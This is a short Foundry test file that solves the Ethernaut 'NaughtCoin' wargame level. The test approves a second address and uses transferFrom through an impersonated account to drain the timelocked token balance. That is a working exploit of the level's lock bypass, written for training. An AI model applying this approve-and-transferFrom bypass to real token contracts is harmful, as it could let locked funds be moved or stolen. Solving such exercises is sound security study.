// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {NaughtCoin} from "ethernaut/levels/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public victimToken;
    address public alice = address(0x1000);
    address public bob = address(0x2000);

    function setUp() public {
        victimToken = new NaughtCoin(address(this));
    }

    function testAttack() external {
        victimToken.approve(alice, type(uint256).max);

        vm.startPrank(alice);
        victimToken.transferFrom(address(this), alice, 1000000 ether);

        assertTrue(victimToken.balanceOf(address(this)) == 0);
    }
}
